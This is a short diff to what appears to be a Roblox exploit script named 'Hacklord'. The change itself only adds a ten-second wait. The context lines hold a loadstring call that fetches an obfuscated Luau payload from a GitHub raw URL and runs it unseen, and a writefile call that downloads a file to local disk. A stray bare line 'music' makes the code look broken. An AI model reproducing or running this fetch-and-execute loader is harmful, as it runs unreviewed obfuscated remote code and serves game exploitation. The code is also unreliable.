@@ -20,6 +20,8 @@ ScriptSettings = {
 --Loadstring
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxinStud10/24-Hours/refs/heads/main/Obfuscations/Hacklord.luau"))()
 
+task.wait(10)
+
 music
 -- get da hacklord song
 writefile("Hacklord.mp3", game:HttpGet("https://github.com/ian49972/smth/raw/refs/heads/main/Hacklord.mp3"))
